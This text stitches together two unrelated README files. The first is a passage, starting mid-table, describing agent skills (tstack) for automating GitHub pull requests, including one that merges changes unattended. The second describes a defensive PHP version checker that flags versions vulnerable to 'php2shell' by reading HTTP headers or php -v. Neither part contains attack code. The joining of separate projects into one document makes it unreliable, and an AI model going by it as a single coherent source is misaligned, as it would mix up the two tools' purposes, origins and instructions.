| `full-send` | "full send" | Takes a change to a merged PR with nobody watching: proves it, reviews it, files it, babysits it, merges it. |
| `full-stop` | "full stop" | Same as `full-send`, but stops when the PR is ready for you to merge. |
| `council` | "council" | Gets review from three models from different providers, and loops until they agree. |
| `sol-loop` | "sol loop" | Reviews a change with GPT Sol in a loop until both agents agree. |
| `file-pr` | "file a PR" | Files a short PR that leads with the problem, not an inventory of changes. |
| `takeover` | "take over" | Finishes someone else's PR, branch, or agent thread, and keeps their credit. |
| `babysit-pr` | "babysit" | Watches a PR through CI and review bots, and fixes the real findings. |
| `modernize` | "modernize" | Rebases an old PR and decides if it should still exist. |
| `leaving-pr-comments` | (automatic) | Formats comments that an agent posts on your behalf. |

Some skills call others. Install the ones they need too:

- `full-send` uses `sol-loop`, `file-pr`, and `babysit-pr`.
- `full-stop` uses `full-send`.
- `takeover` uses `modernize`, `file-pr`, `babysit-pr`, and `leaving-pr-comments`.
- `file-pr`, `babysit-pr`, and `modernize` use `leaving-pr-comments`.

## Install

```bash
git clone https://github.com/t3dotgg/tstack
cp -R tstack/skills/* ~/.claude/skills/   # Claude Code
cp -R tstack/skills/* ~/.codex/skills/    # Codex
```

## Requirements

- An authenticated [GitHub CLI](https://cli.github.com) (`gh`).
- `python3` for `babysit-pr`'s `pr-wait` script.
- `council` and `sol-loop` need subagents on other providers' models. T3 Code
  does this with `delegate_task`. Otherwise you need a harness that can run
  those models.

## Make them yours

These are starting points. Edit them. Put personal settings, like which models
sit on your council, in your `CLAUDE.md` or `AGENTS.md`, so you can update the
skills without losing them.

# PHP Version Checker

Check a website or local PHP binary to see if it's vulnerable to php2shell.

To install both skills, ask Codex:

```text
$skill-installer install both skills from https://github.com/openai/php2shell-checker
```

Use [phpcheck-server](skills/phpcheck-server/SKILL.md) when you have server
access, or [phpcheck-url](skills/phpcheck-url/SKILL.md) when you only have a URL:

```text
$phpcheck-url check https://example.com
```

```text
$phpcheck-server check the PHP version serving my site
```

## Run directly

Check a website:

```sh
node phpcheck.js "https://example.com"
```

Check the local CLI PHP

```sh
node phpcheck.js --local
```

## Results

| Result | Exit code | Meaning |
| --- | --- | --- |
| `OK` | `0` | Stable PHP patch version above the embedded cutoff for a listed major/minor branch. |
| `VULNERABLE` | `1` | PHP version at or below the embedded cutoff for that branch. |
| `UNKNOWN` | `3` | No PHP version or response, an unrecognized version/branch, or a newer prerelease build. |

Use `--json` for machine-readable output (`patch_status` is `ok`, `vulnerable`,
or `unknown`). Invalid arguments exit with code `2`.

## Tests

```sh
node --test phpcheck.test.js
```

Tests run the CLI against local HTTP servers and a fake PHP executable.
No PHP installation or external website is required.

## Limitations

The checker only evaluates versions exposed in HTTP response headers or by
`php -v`. It reads `X-Powered-By` and `Server`, sends `HEAD`, and falls back to
`GET` only when `HEAD` returns 405 or 501. It does not follow redirects or
inspect response bodies. Missing or hidden PHP headers return `UNKNOWN`.

`OK` is a version comparison based on the assumption that subsequent stable patches in each listed branch contain the fix.
It does not independently verify a security fix. Check the versions against
the official PHP security release. Headers can be hidden or changed, and distribution backports may
not change the upstream version. `UNKNOWN` does not mean the target is patched!
